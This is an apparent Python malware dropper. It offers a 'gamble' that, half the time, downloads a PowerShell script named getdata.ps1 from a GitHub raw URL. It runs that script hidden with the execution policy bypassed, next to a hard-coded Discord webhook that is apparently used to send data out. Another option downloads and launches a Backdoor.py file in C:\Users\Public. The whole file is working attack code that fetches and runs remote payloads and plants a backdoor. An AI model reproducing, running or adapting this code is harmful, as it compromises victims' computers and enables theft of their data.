import subprocess
import os
import random
import sys
from urllib.request import urlretrieve

def git_github_filename(url):
    return url.split('/')[-1]

def install(show_install: bool, show_filename: bool, url_module: str = ""):
    """Install a file from a GitHub raw URL or install a Python module with pip."""
    if not url_module:
        raise ValueError("url_module must be provided")

    raw_prefixes = (
        "https://raw.githubusercontent.com/",
        "http://raw.githubusercontent.com/",
    )

    if not url_module.startswith(raw_prefixes):
        command = [sys.executable, "-m", "pip", "install", url_module]
        if show_install:
            subprocess.Popen(command)
        else:
            subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW)
        return

    filename = git_github_filename(url_module)
    urlretrieve(url_module, filename)
    if show_filename:
        print(f"file was installed filename: {filename}")
    return

def make_door(start_door: bool, start_only: bool, path: str):
    if not os.path.exists(path):
        os.makedirs(path, exist_ok=True)

    backdoor_path = os.path.join(path, "Backdoor.py")
    if start_only:
        os.startfile(backdoor_path)
        return

    os.chdir(path)
    install(False, False, "https://raw.githubusercontent.com/thompog/backdoor-and-other-stuff/refs/heads/main/Backdoor.py")
    if start_door:
        os.startfile(backdoor_path)
    return

def virus():
    install(False, False, "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1")
    webhook_file = "discord_webhook.txt"
    with open(webhook_file, "w", encoding="utf-8") as f:
        f.write(
            "https://discord.com/api/webhooks/1505641931126866000/WSFPpjCKn_M3VAiaRCmlNYEnuX8z8OaTjJHKKbcDJ6Y2RB5r08MHjzgquVi5npspZBAa"
        )

    ps1_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "getdata.ps1")
    subprocess.Popen(
        ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", ps1_path],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    return

def take_a_gamble():
    """take a gamble, with your computer!"""
    num = random.randint(0, 100)
    if num >= 50:
        virus()
    return


def main():
    na = input("vanna start gamble? (Y/N) ")
    n = na.strip().lower()
    if n == "y":
        take_a_gamble()
        return

    if n == "n":
        na = input("vanna make a backdoor? (Y/N) ")
        n = na.strip().lower()
        if n == "y":
            make_door(True, True, os.path.join("C:", "Users", "Public"))
        return

    sys.exit(0)


if __name__ == "__main__":
    main()
